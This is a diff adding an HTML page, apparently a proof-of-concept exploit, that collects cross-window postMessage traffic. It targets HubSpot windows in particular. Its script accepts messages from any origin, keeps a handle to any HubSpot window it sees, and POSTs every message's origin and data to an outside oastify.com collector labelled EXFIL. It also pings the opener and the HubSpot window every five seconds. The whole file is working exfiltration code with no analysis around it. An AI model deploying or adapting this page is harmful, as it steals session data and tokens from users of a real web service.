@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head><title>Collector</title></head>
+<body>
+<h1>Message Collector Active</h1>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:400px;overflow:auto;"></div>
+
+<script>
+const EXFIL = 'https://2psm26pbwwjsvjp5bhe2j9v6axgo4es3.oastify.com';
+
+function log(msg) {
+    const d = document.getElementById('log');
+    d.innerHTML += '<br>' + msg;
+    d.scrollTop = d.scrollHeight;
+}
+
+log('Collector loaded');
+log('Origin: ' + window.origin);
+log('Opener exists: ' + (window.opener ? 'YES' : 'NO'));
+
+let hubspotWindow = null;
+let messageCount = 0;
+
+// Listen for messages from ANY window
+window.addEventListener('message', e => {
+    messageCount++;
+    
+    log('Message #' + messageCount + ' from: ' + e.origin);
+    log('Data type: ' + (e.data.type || typeof e.data));
+    
+    // Store reference to HubSpot window
+    if (e.origin.includes('hubspot')) {
+        hubspotWindow = e.source;
+        log('Got HubSpot window reference!');
+    }
+    
+    // Exfiltrate all data
+    const data = JSON.stringify(e.data);
+    
+    fetch(EXFIL + '/msg_' + messageCount, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({
+            origin: e.origin,
+            data: e.data,
+            count: messageCount
+        })
+    });
+    
+    // Log preview
+    log('Data preview: ' + data.substring(0, 100));
+});
+
+// If we were opened by another window, try to get a reference to HubSpot
+if (window.opener) {
+    log('We have an opener');
+    
+    // Try to access opener's other windows
+    try {
+        log('Trying to access opener properties...');
+        
+        // Send a ping to opener
+        window.opener.postMessage({type: 'COLLECTOR_READY'}, '*');
+        log('Sent COLLECTOR_READY to opener');
+        
+    } catch(e) {
+        log('Error accessing opener: ' + e.message);
+    }
+}
+
+// Keep sending pings to get responses
+setInterval(() => {
+    if (window.opener) {
+        window.opener.postMessage({
+            type: 'COLLECTOR_PING',
+            timestamp: Date.now()
+        }, '*');
+    }
+    
+    if (hubspotWindow) {
+        hubspotWindow.postMessage({
+            type: 'COLLECTOR_PING',
+            timestamp: Date.now()
+        }, '*');
+    }
+}, 5000);
+
+log('Listening for messages...');
+</script>
+</body>
+</html>
